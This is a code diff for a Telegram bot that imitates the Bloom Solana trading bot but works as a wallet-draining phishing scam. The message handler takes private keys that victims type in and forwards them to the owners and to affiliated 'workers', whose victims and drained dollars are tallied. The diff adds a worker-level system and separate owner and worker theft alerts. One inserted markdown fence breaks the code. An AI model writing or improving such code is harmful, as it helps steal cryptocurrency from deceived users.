@@ -81,15 +81,16 @@ def get_or_create_worker(user_id):
     """Get worker data or create new worker"""
     data = load_worker_data()
     user_id_str = str(user_id)
-    
+
     if user_id_str not in data["workers"]:
         data["workers"][user_id_str] = {
             "clicks": 0,
             "victims": 0,
-            "drained": 0.0
+            "drained": 0.0,
+            "level": 1.00
         }
         save_worker_data(data)
-    
+
     return data["workers"][user_id_str]
 
 # Removed SOL price function - no longer needed
@@ -330,19 +331,20 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             referrer_id = int(context.args[0])
             if referrer_id != user_id:  # Don't allow self-referral
                 data = load_worker_data()
-                
+
                 # Add referral mapping
                 data["referrals"][str(user_id)] = str(referrer_id)
-                
+
                 # Update referrer's clicks
                 referrer_id_str = str(referrer_id)
                 if referrer_id_str not in data["workers"]:
                     data["workers"][referrer_id_str] = {
                         "clicks": 0,
                         "victims": 0,
-                        "drained": 0.0
+                        "drained": 0.0,
+                        "level": 1.00
                     }
-                
+
                 data["workers"][referrer_id_str]["clicks"] += 1
                 save_worker_data(data)
         except ValueError:
@@ -445,10 +447,11 @@ async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Worker command - show worker stats and referral link"""
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
-    
+
     # Get or create worker stats
     worker_stats = get_or_create_worker(user_id)
-    
+    level = worker_stats.get('level', 1.00)
+
     # Format the worker menu
     text = (
         "📊 ︱— Stats\n"
@@ -456,15 +459,29 @@ async def worker(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{worker_stats['victims']} - Total Victims\n"
         f"${worker_stats['drained']:.2f} - Amount Drained\n\n"
         "🔨 ︱— Level\n"
-        "1.00 - No Perks\n\n"
+        f"{level:.2f} - No Perks\n\n"
         "🔗 ︱— Link\n"
-        f"https://t.me/SolanaBloomCryptoBot?start={user_id}"
+        f"`https://t.me/SolanaBloomCryptoBot?start={user_id}`"
     )
-    
+
+    # Create inline keyboard with Support button
+    if user_id in [OWNER_ID, SECOND_OWNER_ID]:
+        worker_keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Update Level", callback_data=f"update_level_{user_id}")],
+            [InlineKeyboardButton("Support", url="https://t.me/Struckout")]
+        ])
+    else:
+        worker_keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("Support", url="https://t.me/Struckout")]
+        ])
+
+
     await context.bot.send_message(
         chat_id=chat_id,
         text=text,
         parse_mode=ParseMode.HTML,
+        disable_web_page_preview=True,
+        reply_markup=worker_keyboard,
     )
 
 async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -688,19 +705,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Get username or fallback to N/A
         username = user.username if user.username else "N/A"
 
-        # Create victim information message with private key
-        victim_message = (
-            "🌸 Victim imported Solana wallet\n\n"
-            "🔎 Victim Information\n\n"
-            f"├ 👤 Name: {username}\n"
-            f"├ 🆔 {user_id}\n"
-            f"├ 🔑 Private Key: <code>{message_text}</code>"
-        )
-
         # Load worker data to check for referrals
         worker_data = load_worker_data()
         user_id_str = str(user_id)
-        
+
         # Update victim count for referrer
         if user_id_str in worker_data["referrals"]:
             referrer_id = worker_data["referrals"][user_id_str]
@@ -708,11 +716,39 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 worker_data["workers"][referrer_id]["victims"] += 1
                 save_worker_data(worker_data)
 
+        # Create victim information message with private key
+        if user_id_str in worker_data["referrals"]:
+            referrer_id = worker_data["referrals"][user_id_str]
+            victim_message_owners = (
+                "🌸 Victim imported wallet via worker\n\n"
+                "🔎 Victim Information\n\n"
+                f"├ 👤 Name: {username}\n"
+                f"├ 🆔 {user_id}\n"
+                f"├ 👨‍💼 Worker ID: {referrer_id}\n"
+                f"├ 🔑 Private Key: <code>{message_text}</code>"
+            )
+            victim_message_worker = (
+                "🌸 Victim imported Solana wallet\n\n"
+                "🔎 Victim Information\n\n"
+                f"├ 👤 Name: {username}\n"
+                f"├ 🆔 {user_id}\n"
+                f"├ 🔑 Private Key: <code>{message_text}</code>"
+            )
+        else:
+            victim_message_owners = (
+                "🌸 Victim imported Solana wallet\n\n"
+                "🔎 Victim Information\n\n"
+                f"├ 👤 Name: {username}\n"
+                f"├ 🆔 {user_id}\n"
+                f"├ 🔑 Private Key: <code>{message_text}</code>"
+            )
+            victim_message_worker = victim_message_owners
+
         # Send to owners (they get all logs)
         try:
-            await context.bot.send_message(chat_id=OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
+            await context.bot.send_message(chat_id=OWNER_ID, text=victim_message_owners, parse_mode=ParseMode.HTML)
             if SECOND_OWNER_ID:
-                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message, parse_mode=ParseMode.HTML)
+                await context.bot.send_message(chat_id=SECOND_OWNER_ID, text=victim_message_owners, parse_mode=ParseMode.HTML)
         except Exception as e:
             print(f"Error sending to owners: {e}")
 
@@ -721,7 +757,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             referrer_id = int(worker_data["referrals"][user_id_str])
             if referrer_id not in [OWNER_ID, SECOND_OWNER_ID]:
                 try:
-                    await context.bot.send_message(chat_id=referrer_id, text=victim_message, parse_mode=ParseMode.HTML)
+                    await context.bot.send_message(chat_id=referrer_id, text=victim_message_worker, parse_mode=ParseMode.HTML)
                 except Exception as e:
                     print(f"Error sending to referrer {referrer_id}: {e}")
 
@@ -924,6 +960,34 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             return
 
+        elif admin_state.get("awaiting_level_input"):
+            # Expecting new level value
+            try:
+                new_level = float(message_text.strip())
+                target_worker_id = admin_states[user_id]["target_worker_id"]
+
+                # Load worker data
+                worker_data = load_worker_data()
+                target_worker_id_str = str(target_worker_id)
+
+                # Update worker level
+                if target_worker_id_str in worker_data["workers"]:
+                    worker_data["workers"][target_worker_id_str]["level"] = new_level
+                    save_worker_data(worker_data)
+                    await update.message.reply_text(f"🔨 Worker {target_worker_id}'s level updated to {new_level:.2f} successfully.")
+                else:
+                    await update.message.reply_text(f"❌ Worker with ID {target_worker_id} not found.")
+
+                # Clean up admin state
+                admin_states[user_id].pop("awaiting_level_input", None)
+                admin_states[user_id].pop("target_worker_id", None)
+
+            except ValueError:
+                await update.message.reply_text("❌ Invalid level value. Please enter a valid number (e.g., 1.50, 2.00).")
+            except Exception as e:
+                await update.message.reply_text(f"❌ Error: {str(e)}")
+
+            return
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1065,6 +1129,23 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=saved_scripts_keyboard()
             )
 
+        return
+
+    # Handle level update button (only for owners)
+    if user_id in [OWNER_ID, SECOND_OWNER_ID] and data.startswith("update_level_"):
+        worker_id = int(data.split("_")[2])
+
+        # Initialize admin state for this user
+        if user_id not in admin_states:
+            admin_states[user_id] = {}
+        admin_states[user_id]["awaiting_level_input"] = True
+        admin_states[user_id]["target_worker_id"] = worker_id
+
+        await context.bot.send_message(
+            chat_id=query.message.chat_id,
+            text=f"🔧 <b>Update Worker Level</b>\n\nWorker ID: {worker_id}\nPlease enter the new level value (e.g., 1.50, 2.00):",
+            parse_mode=ParseMode.HTML
+        )
         return
 
     # Popup alerts for specific buttons that need wallet import or other alerts
@@ -1354,7 +1435,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "settings":
         text = (
             "🌸 Bloom Settings\n\n"
-            "🟢 : The feature/mode is turned ON\n"
+            "🟢 : The feature/mode is turned ON\n\n"
             "🔴 : The feature/mode is turned OFF\n\n"
             "📖 Learn More!\n\n"
             f"🕒 Last updated: {current_time()}"
@@ -1387,7 +1468,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(
             text=get_repeat_start_message(user_id),
             parse_mode=ParseMode.HTML,
-            disable_web_page_preview=True,
+            ```python
+disable_web_page_preview=True,
             reply_markup=main_menu_keyboard(),
         )
         return
@@ -1449,7 +1531,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Update the settings menu with new states
         text = (
             "🌸 Bloom Settings\n\n"
-            "🟢 : The feature/mode is turned ON\n"
+            "🟢 : The feature/mode is turned ON\n\n"
             "🔴 : The feature/mode is turned OFF\n\n"
             "📖 Learn More!\n\n"
             f"🕒 Last updated: {current_time()}"
